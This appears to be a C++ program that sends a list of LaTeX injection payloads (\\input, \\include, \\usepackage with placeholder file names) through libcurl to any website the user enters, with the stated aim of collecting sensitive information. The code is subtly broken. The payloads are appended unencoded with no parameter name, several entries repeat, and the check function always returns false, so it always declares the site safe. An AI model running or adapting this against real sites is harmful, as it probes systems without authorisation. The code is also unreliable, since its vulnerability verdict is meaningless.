#include <iostream>
#include <string>
#include <curl/curl.h>
#include <regex>

using namespace std;

// Callback function to handle response data
size_t writeCallback(char* ptr, size_t size, size_t nmemb, void* userdata) {
    return fwrite(ptr, size, nmemb, stdout);
}

// Function to test for LaTeX injection vulnerability and collect sensitive information
bool testLaTeXInjection(const string& url) {
    // List of payloads to test for LaTeX injection and collect sensitive information
    string payloads[] = {
        "\\input{file.tex}",
        "\\include{file.tex}",
        "\\usepackage{file.tex}",
        "\\documentclass{article}\\begin{document}Sensitive content\\end{document}",
        "\\input{file.pdf}",
        "\\include{file.pdf}",
        "\\usepackage{file.pdf}",
        "\\documentclass{article}\\begin{document}Sensitive content\\end{document}",
        "\\input{file.jpg}",
        "\\include{file.jpg}",
        "\\usepackage{file.jpg}",
        "\\documentclass{article}\\begin{document}Sensitive content\\end{document}"
        // Add more payloads as needed
    };

    CURL* curl = curl_easy_init();
    if (!curl) {
        cerr << "Failed to initialize cURL." << endl;
        return false;
    }

    // Set cURL options
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);

    // Perform tests with each payload
    for (const string& payload : payloads) {
        // Construct the full URL with the payload
        string testUrl = url + "?" + payload;
        curl_easy_setopt(curl, CURLOPT_URL, testUrl.c_str());

        // Perform the HTTP request
        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            cerr << "Failed to perform HTTP request: " << curl_easy_strerror(res) << endl;
            continue;
        }
    }

    // Cleanup
    curl_easy_cleanup(curl);

    // If no payload was successful in finding sensitive information
    return false;
}

int main() {
    string targetWebsite;

    // Prompt user to enter target website URL
    cout << "Enter your target website URL: ";
    cin >> targetWebsite;

    // Test for LaTeX injection vulnerability and collect sensitive information
    bool isVulnerable = testLaTeXInjection(targetWebsite);

    // Display result
    if (isVulnerable) {
        cout << "\033[1;31mThe target website is vulnerable to LaTeX injection!\033[0m" << endl;
        cout << "Sensitive information may have been collected. Check the output for highlighted content." << endl;
    } else {
        cout << "\033[1;32mThe target website is not vulnerable to LaTeX injection.\033[0m" << endl;
    }

    return 0;
}
